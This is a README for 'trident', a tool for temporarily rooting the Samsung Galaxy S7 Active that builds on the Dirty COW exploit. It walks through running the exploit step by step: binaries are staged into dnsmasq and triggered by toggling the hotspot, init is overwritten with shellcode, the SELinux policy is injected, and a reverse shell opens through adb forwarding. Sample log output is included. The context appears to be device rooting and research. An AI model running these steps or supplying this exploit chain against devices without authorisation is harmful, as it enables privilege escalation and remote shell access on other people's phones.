## trident
Temporary root for the galaxy s7 active. 

## How
 * Clone this project and either 
   * build (run `make`) and place a custom `sepolicy` file in the root of the project, or 
   * `tar xf` the [prebuilt binaries]() in the root of the project.
 * Open a separate terminal window and run `make log` to see logged output.
 * Run `make run` to start the exploit. You should see 
```
[+] stager loading /data/local/tmp/load
[+] stager loaded /data/local/tmp/load. trigger by enabling wifi tethering
sepolicy injection binary loaded into dnsmasq. hit enter when completed.
```
 * On your phone, go to Settings > Connections > Mobile Hotspot and Tethering > Mobile Hotspot and turn it on. At this point, text should start appearing in the `make log` window. Wait until it is done: 
```
I trident : [+] load started
I trident : [+] overwriting init to terminate early
I trident : madvise: 0
I trident : proc: -1178599424
I trident : [+] overwriting init function with shellcode
I trident : madvise: 0
I trident : proc: -764411904
I trident : [+] overwriting init function with a nop
I trident : madvise: 0
I trident : proc: -1178599424
I trident : [+] load done!
```
 * Turn off the mobile hotspot. 
 * Hit enter in the `make run` window to continue: 
```
adb forward tcp:4040 tcp:4040
adb shell /data/local/tmp/stage /data/local/tmp/reverse
[+] stager loading /data/local/tmp/reverse
[+] stager loaded /data/local/tmp/reverse. trigger by enabling wifi tethering
reverse shell binary loaded into dnsmasq. run 'make connect' when completed
```
 * Turn the hotspot on and off again.
 * run `make connect`

You should now have a root shell! If any permissions issues come up, modify the sepolicy file with sepolicy-inject and upload the new version to `/data/local/tmp/sepolicy`. The new version should be loaded in a few seconds. These problems are easiest to debug with the command `adb logcat | grep -a avc`.

## Versions
This code has only been tested for the Galaxy S7 Active on the September security patch. To make this work on other versions, `INIT_OFFSET` in `farm.c` may need to be modified.

## Thanks
 * https://github.com/timwr/CVE-2016-5195
 * https://bitbucket.org/joshua_brindle/sepolicy-inject
